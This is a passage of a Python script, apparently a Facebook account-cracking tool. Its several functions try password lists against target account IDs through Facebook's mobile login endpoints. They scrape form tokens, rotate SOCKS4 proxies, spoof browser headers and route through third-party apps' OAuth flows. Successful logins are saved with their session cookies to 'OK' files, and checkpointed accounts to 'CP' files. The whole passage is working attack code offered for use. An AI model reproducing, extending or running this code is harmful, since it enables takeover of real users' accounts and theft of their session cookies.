        }
      params = {'api_key': '469724967619195','auth_token': 'e30a80f9070ee8fc49a23998b8eb9b54','skip_api_login': '1','signed_next': '1','next': 'https://m.facebook.com/v3.2/dialog/oauth?app_id=469724967619195&cbt=1697161758144&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2c5574a5c040a8%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener&client_id=469724967619195&display=touch&domain=page.palm.tech&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fpage.palm.tech%2Fpalm-id%2F%23%2Flogin%3Fclient-id%3Ditel-global%26callbackUrl%3Dhttp%253A%252F%252Fclub.itel-life.com%252F%26language%3Den_US%26brandId%3Ditel&locale=en_US&logger_id=f34548c36d16038&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df18f150b67c9dac%26domain%3Dpage.palm.tech%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fpage.palm.tech%252Ff2751a06ed883e4%26relation%3Dopener%26frame%3Df18a7b805567f3c&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=email%2Cuser_likes&sdk=joey&version=v3.2&ret=login&fbapp_pres=0&tp=unspecified','refsrc': 'deprecated','app_id': '469724967619195','cancel': 'https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#cb=f18f150b67c9dac&domain=page.palm.tech&is_canvas=false&origin=https%3A%2F%2Fpage.palm.tech%2Ff2751a06ed883e4&relation=opener&frame=f18a7b805567f3c&error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied','lwv': '100','locale2': 'id_ID','refid': '9',}
      po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',params=params,data=date,headers=head,allow_redirects=False,proxies=proxs)
      if "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        coki = po.cookies.get_dict()
        kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
        print(f"{biru}╭────────────────────────────╮{puti}")
        tree = Tree("")
        tree.add(f"\r{hijo}{idf}{puti}").add(f"{hijo}{pw}{puti}").add(f"{mer}{tahun(idf)}{puti}")
        tree.add(f"{hijo}{kuki}{puti}").add(f"{mer}{ua}{puti}")
        print(f"{hijo}╰────────────────────────────╯{puti}")
        prints(tree)
        open('CYXIEON-OK/'+'CYXIEON-OK.txt','a').write(idf+'|'+pw+'|'+'\n')
        open('CYXIEON-OK/'+'CYXIEON-WhithCookies.txt','a').write(idf+'|'+pw+'|'+kuki+'|''\n')
        break	
      elif "checkpoint" in po.cookies.get_dict().keys():
        print(f"{hijo}╭────────────────────────────╮{puti}")
        tree = Tree("")
        tree.add(f"\r{kun}{idf}{puti}").add(f"{kun}{pw}{puti}")
        tree.add(f"{mer}{tahun(idf)}{puti}").add(f"{mer}{ua}{puti}")
        print(f"{hijo}╰────────────────────────────╯{puti}")
        prints(tree)
        open('CYXIEON-CP/'+'CYXIEON-CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        akune.append(idf+'|'+pw)
        ceker(idf,pw)
        cp+=1
        break	
      else:
        continue
    except requests.exceptions.ConnectionError:time.sleep(31)
  loop+=1
#-------------------[ METODE-B-API ]-----------------#
def rr071(idf,pwx):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ses = requests.Session()
	sys.stdout.write(f"\r[{bo}RR07 v1{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwx:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1703501188&hrc=1&wtsid=rdr_033qmBEAwHwueyH7Q&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1132078350149238&kid_directed_site=0&app_id=1132078350149238&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1703501188&hrc=1&wtsid=rdr_033qmBEAwHwueyH7Q&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1132078350149238&auth_token=cc90dbbd519ef9abbb3cccc56d77fd56&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D1132078350149238%26redirect_uri%3Dhttps%253A%252F%252Faccounts.epicgames.com%252FOAuthAuthorized%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%26scope%3Demail%252Cpublic_profile%252Cuser_friends%26service_entity%3Dundefined%26force_verify%3Dtrue%26response_type%3Dcode%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da37eb2e2-b948-4c11-9230-ffb2f928a308%26tp%3Dunspecified&refsrc=deprecated&app_id=1132078350149238&cancel=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJpZCI6ImE5NzNjNzM0NjljYjQxMDhiNDRhY2Q2YjdhMTUwZDI0In0%253D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{idf}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{P2} ╰─▶ [bold purple]{ua}")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{idf}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{P2} ╰─▶ [bold green]{kuki}")
				print(f"\r{P2} ╰─▶ [bold purple]{ua}")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#------------------[ METODE-MBASIC-2 ]-------------------#
def rr072(idf,pwx):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ses = requests.Session()
	sys.stdout.write(f"\r[{bo}RR07 v2{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwx:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link= ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {"lsd":re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			cok = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])
			cok+=' m_pixel_ratio=2.625; wd=412x756'
			headers={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not)A;Brand";v="98", "Chromium";v="99"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.7,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','x-requested-with': 'com.facebook.katana','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=312563225523989&kid_directed_site=0&app_id=312563225523989&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv17.0%2Fdialog%2Foauth%3Fapp_id%3D312563225523989%26cbt%3D1694968006466%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3520793fb24f3c%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%26client_id%3D312563225523989%26display%3Dtouch%26domain%3Dm.shein.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fm.shein.com%252Fid%252Fuser%252Fsetting%26locale%3Den_US%26logger_id%3Df3bbbc53ca261cc%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3e1bba7bfb1b54%2526domain%253Dm.shein.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fm.shein.com%25252Ff3d3220ff07f6a8%2526relation%253Dopener%2526frame%253Df1db714302eb3d4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv17.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df3e1bba7bfb1b54%26domain%3Dm.shein.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fm.shein.com%252Ff3d3220ff07f6a8%26relation%3Dopener%26frame%3Df1db714302eb3d4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{idf}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{P2} ╰─▶ [bold green]{kuki}")
				print(f"\r{P2} ╰─▶ [bold purple]{ua}")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{idf}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{P2} ╰─▶ [bold purple]{ua}")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#---------------------[ METODE-TOUCH-3 ]---------------------#
def rr073(idf,pwx):
	global loop,ok,cp
	ua = random.choice(ugen)
	sys.stdout.write(f"\r[{bo}RR07 v3{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1096408964130955&kid_directed_site=0&app_id=1096408964130955&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-debug': 'J9sEtS6VttXEZAdcwAFuSgNaCOI+M5AmEWyzsFKgRS5OcUfo5ViX/5Z7oCmzHaEUfZRLKdk3pnc2r3/ttOBDEg==','content-length': '0','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-user': '?1','sec-fetch-dest': 'empity','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1096408964130955&kid_directed_site=0&app_id=1096408964130955&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1096408964130955&auth_token=46c61636e7c46590956dbdf2060b3ea3&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.10%2Fdialog%2Foauth%3Fclient_id%3D1096408964130955%26state%3D817e5400986e72e6ea87eeae01cd218b%26response_type%3Dcode%26sdk%3Dphp-sdk-5.1.4%26redirect_uri%3Dhttps%253A%252F%252Fcutt.ly%252Flogin%252Ffb-login%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D98ba1bac-db96-4144-b063-1635213c7a4d%26tp%3Dunspecified&refsrc=deprecated&app_id=1096408964130955&cancel=https%3A%2F%2Fcutt.ly%2Flogin%2Ffb-login%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D817e5400986e72e6ea87eeae01cd218b%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{idf}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{P2} ╰─▶ [bold purple]{ua}")
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				print(f"\r{H2}  ⫸{P2} User Id : {B2}{idf}")
				print(f"\r{H2}  ⫸{P2} Password : {B2}{pw}")
				print(f"\r{P2} ╰─▶ [bold green]{kuki}")
				print(f"\r{P2} ╰─▶ [bold purple]{ua}")
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
###-----[ METODE VALIDATE ]-----###
def rr074(uid,pwx):
	global loop,ok,cp
	sys.stdout.write(f"\r[{bo}RR07 v4{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] [{U}OK-{x}:{H}{ok}{x}] [{U}CP-{x}:{K}{cp}{x}] [{U}Crack-:{bo}{idf}{x}]"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwx:
		try:
			if 'uadia' in uadarimu: ua = uadia[0]
			else:ua = ugen()
			link = ses.get(f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr").text
			data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1),"uid": uid,"next": "https://free.prod.facebook.com/v3.3/dialog/oauth?client_id=190291501407&redirect_uri=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback&scope=email&response_type=code&state=pxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5&ret=login&fbapp_pres=0&logger_id=dd58b980-4f31-44c0-9524-5490fc11be47&tp=unspecified","flow": "login_no_pin","pass": pw}
			headers = {"Host": "free.prod.facebook.com","content-length": "479","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://free.prod.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "com.opera.mini.native","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://free.prod.facebook.com/login/device-based/password/?uid={uid}&flow=login_no_pin&skip_api_login=1&api_key=190291501407&kid_directed_site=0&app_id=190291501407&signed_next=1&next=https%3A%2F%2Ffree.prod.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D190291501407%26redirect_uri%3Dhttps%253A%252F%252Fwww.weebly.com%252Fapp%252Ffront-door%252Flogin%252Ffacebook%252Fcallback%26scope%3Demail%26response_type%3Dcode%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd58b980-4f31-44c0-9524-5490fc11be47%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.weebly.com%2Fapp%2Ffront-door%2Flogin%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DpxUwYNBEWsq7P67MHHYTUYpY2goFoxj0TUutWoP5%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			post = ses.post("https://free.prod.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers, allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
